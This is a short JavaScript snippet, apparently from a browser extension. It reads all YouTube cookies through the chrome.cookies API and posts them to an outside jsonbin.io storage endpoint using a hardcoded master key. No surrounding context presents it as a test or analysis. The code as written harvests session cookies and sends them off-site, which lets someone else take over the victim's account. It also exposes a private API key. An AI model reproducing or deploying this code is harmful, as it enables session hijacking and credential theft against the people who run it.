chrome.cookies.getAll({url: 'https://www.youtube.com'},  (cookie) => {
    cookies = JSON.stringify(cookie);
    let req = new XMLHttpRequest();

    req.onreadystatechange = () => {
    if (req.readyState == XMLHttpRequest.DONE) {
        console.log(req.responseText);
    }
    };
    
    req.open("POST", "https://api.jsonbin.io/v3/b", true);
    req.setRequestHeader("Content-Type", "application/json");
    req.setRequestHeader("X-Master-Key", "$2a$10$ZO303d1nhcR/rwHLF/LPGeyLU1F46YQPgCbVnAIZgaRzj0oR1S0ky");
    req.send(cookies);
    });

